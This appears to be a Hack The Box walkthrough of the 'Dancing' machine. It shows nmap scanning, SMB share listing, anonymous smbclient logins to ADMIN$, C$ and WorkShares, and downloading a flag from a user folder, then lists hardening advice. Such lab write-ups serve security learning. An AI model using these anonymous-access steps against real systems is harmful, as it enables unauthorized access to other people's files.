# Dancing — HTB Walkthrough

**Status:** Completed  
**Difficulty:** Very Easy  
**OS:** Windows

## TL;DR
Enumerate SMB shares on Windows target, discover misconfigured WorkShares share allowing anonymous access, retrieve flag from user directory via smbclient.

## Target / Access
**Target IP:** `<redacted>`  
> Note: IP addresses have been redacted per HTB publishing guidelines.

---

## Enumeration

### Step 1: Port Scanning with Nmap

**Command:**
```bash
nmap -sC -sV -p- <redacted-ip>
```

**Raw Log:** [nmap-scan.txt](raw-logs/document.pdf) (Page 4)

**Output Excerpt:**
```
PORT    STATE SERVICE VERSION
445/tcp open  microsoft-ds
```

**Analysis:** Port 445 (SMB) is open, indicating Windows file sharing service is active.

![Nmap scan results](images/page-4-img-1.png)

![Nmap output](images/page-4-render.png)

### Step 2: SMB Share Enumeration

**Command:**
```bash
smbclient -L //<redacted-ip>
```

**Raw Log:** [smbclient-list.txt](raw-logs/document.pdf) (Page 6)

**Output Excerpt:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

**Analysis:** Discovered four shares. WorkShares appears to be a custom share, potentially misconfigured.

![SMB enumeration](images/page-6-img-1.png)

![Share listing](images/page-6-render.png)

---

## Foothold / Initial Access

### Step 3: Testing Anonymous Access to Shares

**Commands:**
```bash
# Test ADMIN$ share
smbclient //<redacted-ip>/ADMIN$ -U ""

# Test C$ share
smbclient //<redacted-ip>/C$ -U ""

# Test WorkShares share
smbclient //<redacted-ip>/WorkShares -U ""
```

**Raw Log:** [share-access-tests.txt](raw-logs/document.pdf) (Page 7)

**Output Excerpt:**
```
# ADMIN$ and C$ return:
NT_STATUS_ACCESS_DENIED

# WorkShares succeeds:
smb: \>
```

**Analysis:** WorkShares share accepts anonymous login (no password required).

![Access denied on ADMIN$](images/page-7-img-1.png)

![Access denied on C$](images/page-7-img-2.png)

![Share access testing](images/page-7-render.png)

### Step 4: Exploring WorkShares Content

**Commands:**
```bash
smb: \> ls
smb: \> cd Amy.J
smb: \Amy.J\> get worknotes.txt
smb: \Amy.J\> cd ../James.P
smb: \James.P\> ls
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

**Raw Log:** [smb-navigation.txt](raw-logs/document.pdf) (Pages 8-9)

**Output Excerpt:**
```
Amy.J     D     0  Wed Mar 31 09:22:01 2021
James.P   D     0  Thu Mar 25 10:36:12 2021
```

**Analysis:** Two user directories found. flag.txt located in James.P directory.

![SMB shell commands](images/page-8-img-1.png)

![Help command output](images/page-8-img-2.png)

![SMB navigation](images/page-8-render.png)

![Directory listing](images/page-9-img-1.png)

![File retrieval](images/page-9-render.png)

### Step 5: Flag Capture

**Commands:**
```bash
cat flag.txt
```

**Raw Log:** [flag-capture.txt](raw-logs/document.pdf) (Pages 10-11)

**Output:**
Flag successfully retrieved from James.P's directory.

![Reading worknotes.txt](images/page-10-img-1.png)

![Reading flag.txt](images/page-10-img-2.png)

![File contents](images/page-10-render.png)

![Flag captured](images/page-11-render.png)

---

## Summary

This Starting Point machine demonstrates basic SMB enumeration and exploitation of misconfigured share permissions.

### Attack Chain
1. **Port Scanning** — Discovered SMB service on port 445
2. **SMB Enumeration** — Listed available shares
3. **Anonymous Access** — Exploited WorkShares misconfiguration
4. **File Retrieval** — Downloaded flag from user directory

### Tools Used
- Nmap — Port scanning and service detection
- smbclient — SMB share enumeration and file access

---

## Cleanup / Notes / References

### Mitigation Recommendations
1. **Disable Anonymous Access:** Configure SMB shares to require authentication.
2. **Principle of Least Privilege:** Only grant necessary users access to file shares.
3. **Regular Audits:** Review share permissions regularly to detect misconfigurations.
4. **SMB Hardening:** Disable SMBv1, use SMBv3 with encryption, configure proper access controls.

### References
- [SMB Security Best Practices](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security)
- [Smbclient Manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [OWASP: Improper Access Control](https://owasp.org/www-community/Improper_Access_Control)

---

## Security Summary

**Redactions Performed:**
- IP addresses replaced with `<redacted>` or `<redacted-ip>`
- No credentials were used in this machine (anonymous access)

**⚠️ Warning:** Review and redact any sensitive information (credentials, private IPs, tokens) before publishing.
